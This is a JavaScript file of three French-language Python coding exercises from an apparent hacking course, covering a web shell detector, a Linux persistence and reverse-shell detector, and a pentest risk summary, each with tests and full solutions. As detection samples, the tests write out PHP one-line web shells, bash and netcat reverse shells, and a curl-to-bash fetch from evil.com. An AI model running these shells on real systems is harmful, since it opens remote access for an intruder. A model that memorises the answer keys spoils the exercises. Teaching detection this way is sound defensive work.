/**
 * server/exercises/b3-hacking/chapitre6.js — Exercices du Chapitre 6
 * Chapitre 6 : Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest
 */

module.exports = [
  {
    id: 'hk3-c6-e1',
    chapter: 6,
    title: 'Détecteur de Web Shells et Obfuscation de Scripts Malveillants',
    level: 'n1',
    language: 'python',
    goal: 'Analyser le code d\'un script web pour repérer la présence de web shells et de mécanismes d\'obfuscation.',
    brief: `<p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>
Indicateurs recherchés et scoring de dangerosité :<br>
- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>
- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>
- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>
- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>
Classification finale :<br>
- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>
- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>
- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>
Entrée STDIN : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>
Sortie : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p>`,
    starter: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

# À compléter : calculer le score de suspicion de web shell
`,
    hints: [
      'Extrayez le code après "code=" avec line.split("code=", 1)[1].',
      'Testez la présence des différentes familles de mots-clés.',
      'Attribuez la classification selon les seuils 60 et 20.'
    ],
    examples: [
      {
        stdin: 'SCAN_SCRIPT code=<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>',
        expected: 'WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL',
        note: 'Web shell PHP classique à une ligne combinant system et $_REQUEST.'
      }
    ],
    tests: [
      {
        label: 'Web shell fortement obfusqué combinant eval, base64 et entrées POST',
        stdin: 'SCAN_SCRIPT code=<?php eval(base64_decode($_POST["payload"])); ?>',
        expected: 'WEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL'
      },
      {
        label: 'Script suspect utilisant uniquement base64_decode',
        stdin: 'SCAN_SCRIPT code=<?php $logo = base64_decode("iVBORw0KGgoAAAANSUhEUg=="); ?>',
        expected: 'WEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM'
      },
      {
        label: 'Script légitime de template sans fonction dangereuse',
        stdin: 'SCAN_SCRIPT code=<?php echo "<h1>Bienvenue sur le portail</h1>"; ?>',
        expected: 'WEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW'
      }
    ],
    solution: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

for line in lignes:
    if 'code=' in line:
        _, code = line.split('code=', 1)
    else:
        code = ''
        
    score = 0
    
    # 1. Commande système (+40)
    if any(fn in code for fn in ('system(', 'passthru(', 'shell_exec(', 'popen(')):
        score += 40
        
    # 2. Eval / Assert (+30)
    if any(fn in code for fn in ('eval(', 'assert(')):
        score += 30
        
    # 3. Obfuscation (+20)
    if any(fn in code for fn in ('base64_decode(', 'gzinflate(', 'str_rot13(')):
        score += 20
        
    # 4. Superglobales (+20)
    if any(var in code for var in ('$_GET', '$_POST', '$_REQUEST')):
        score += 20
        
    if score >= 60:
        status = 'MALICIOUS_WEBSHELL'
        risk = 'CRITICAL'
    elif score >= 20:
        status = 'SUSPICIOUS_SCRIPT'
        risk = 'MEDIUM'
    else:
        status = 'BENIGN_CODE'
        risk = 'LOW'
        
    print(f"WEBSHELL_SCAN: score={score} status={status} risk={risk}")
`
  },
  {
    id: 'hk3-c6-e2',
    chapter: 6,
    title: 'Analyseur de Persistance Linux (Crontab & Reverse Shells)',
    level: 'n2',
    language: 'python',
    goal: 'Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).',
    brief: `<p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>
Signatures d'attaques surveillées :<br>
1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>
2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>
3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>
4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>
Règles de diagnostic :<br>
- Si l'une des signatures est présente :<br>
  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>
- Sinon :<br>
  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>
Entrée STDIN : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>
Sortie : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p>`,
    starter: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

# À compléter : détecter les reverse shells dans les persistances
`,
    hints: [
      'Extrayez la commande avec line.split("command=", 1)[1].',
      'Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.',
      'Formatez la sortie PERSIST_RESULT.'
    ],
    examples: [
      {
        stdin: 'PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        expected: 'PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL',
        note: 'Tâche cron récurrente établissant un reverse shell interactif vers l\'attaquant.'
      }
    ],
    tests: [
      {
        label: 'Reverse shell netcat avec redirection de binaire shell',
        stdin: 'PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001',
        expected: 'PERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL'
      },
      {
        label: 'Persistance par téléchargement et exécution de script distant',
        stdin: 'PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash',
        expected: 'PERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL'
      },
      {
        label: 'Tâche cron légitime de sauvegarde et synchronisation',
        stdin: 'PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup',
        expected: 'PERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW'
      }
    ],
    solution: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

for line in lignes:
    if 'command=' in line:
        before_c, cmd = line.split('command=', 1)
    else:
        before_c, cmd = line, ''
        
    params = {}
    for p in before_c.strip().split():
        if '=' in p:
            k, v = p.split('=', 1)
            params[k] = v
            
    a_type = params.get('type', 'UNKNOWN')
    
    if '/dev/tcp/' in cmd or 'bash -i' in cmd:
        malicious = True
        sig = 'BASH_REVERSE_SHELL'
        risk = 'CRITICAL'
    elif 'nc -e' in cmd or 'ncat -e' in cmd or 'nc.traditional' in cmd:
        malicious = True
        sig = 'NETCAT_REVERSE_SHELL'
        risk = 'CRITICAL'
    elif ('curl' in cmd or 'wget' in cmd) and ('| sh' in cmd or '| bash' in cmd):
        malicious = True
        sig = 'DOWNLOAD_EXECUTE'
        risk = 'CRITICAL'
    elif 'python' in cmd and 'socket' in cmd:
        malicious = True
        sig = 'PYTHON_SOCKET_SHELL'
        risk = 'CRITICAL'
    else:
        malicious = False
        sig = 'CLEAN'
        risk = 'LOW'
        
    print(f"PERSIST_RESULT: type={a_type} malicious={str(malicious).upper()} signature={sig} risk={risk}")
`
  },
  {
    id: 'hk3-c6-e3',
    chapter: 6,
    title: 'Générateur de Synthèse Managériale et Matrice de Risque de Pentest',
    level: 'n3',
    language: 'python',
    goal: 'Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.',
    brief: `<p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>
Pondération du score de risque :<br>
- <code>CRITICAL</code> : 10 points chacun.<br>
- <code>HIGH</code> : 5 points chacun.<br>
- <code>MEDIUM</code> : 2 points chacun.<br>
- <code>LOW</code> : 1 point chacun.<br>
<code>risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1)</code>.<br><br>
Qualification de la posture globale de l'organisation :<br>
1. Si <code>C &gt;= 1</code> ou <code>risk_score &gt;= 25</code> : <code>posture=COMPROMISED_CRITICAL</code>.<br>
2. Sinon si <code>H &gt;= 2</code> ou <code>risk_score &gt;= 15</code> : <code>posture=HIGH_EXPOSURE</code>.<br>
3. Sinon si <code>risk_score &gt;= 5</code> : <code>posture=MODERATE_EXPOSURE</code>.<br>
4. Sinon : <code>posture=SECURE_RESILIENT</code>.<br><br>
Entrée STDIN : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</code>.<br>
Sortie :<br>
<code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p>`,
    starter: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

# À compléter : générer la synthèse managériale de pentest
`,
    hints: [
      'Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.',
      'Calculez le score pondéré (10, 5, 2, 1).',
      'Appliquez les conditions de qualification de posture.'
    ],
    examples: [
      {
        stdin: 'PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW',
        expected: 'PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL',
        note: 'Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL.'
      }
    ],
    tests: [
      {
        label: 'Infrastructure avec failles élevées multiples sans faille critique',
        stdin: 'PENTEST_SYNTHESIS findings=xss_stored:HIGH,idor_api:HIGH,weak_password_policy:MEDIUM',
        expected: 'PENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE'
      },
      {
        label: 'Environnement sain avec deux failles mineures d\'en-tête',
        stdin: 'PENTEST_SYNTHESIS findings=missing_csp:LOW,server_banner:LOW',
        expected: 'PENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT'
      },
      {
        label: 'Cumul de failles moyennes atteignant le seuil d\'exposition modérée',
        stdin: 'PENTEST_SYNTHESIS findings=cors_wildcard:MEDIUM,rate_limit_bypass:MEDIUM,directory_listing:MEDIUM',
        expected: 'PENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE'
      }
    ],
    solution: `import sys

lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]

for line in lignes:
    params = {}
    for p in line.strip().split():
        if '=' in p:
            k, v = p.split('=', 1)
            params[k] = v
            
    raw_findings = params.get('findings', '')
    items = [f.strip() for f in raw_findings.split(',') if f.strip()]
    
    crit = 0
    high = 0
    med = 0
    low = 0
    
    for item in items:
        if ':' in item:
            _, sev = item.split(':', 1)
            s_up = sev.strip().upper()
            if s_up == 'CRITICAL':
                crit += 1
            elif s_up == 'HIGH':
                high += 1
            elif s_up == 'MEDIUM':
                med += 1
            elif s_up == 'LOW':
                low += 1
                
    score = (crit * 10) + (high * 5) + (med * 2) + (low * 1)
    
    if crit >= 1 or score >= 25:
        posture = 'COMPROMISED_CRITICAL'
    elif high >= 2 or score >= 15:
        posture = 'HIGH_EXPOSURE'
    elif score >= 5:
        posture = 'MODERATE_EXPOSURE'
    else:
        posture = 'SECURE_RESILIENT'
        
    print(f"PENTEST_SUMMARY: total_findings={len(items)} critical={crit} high={high} medium={med} low={low} risk_score={score} posture={posture}")
`
  }
];
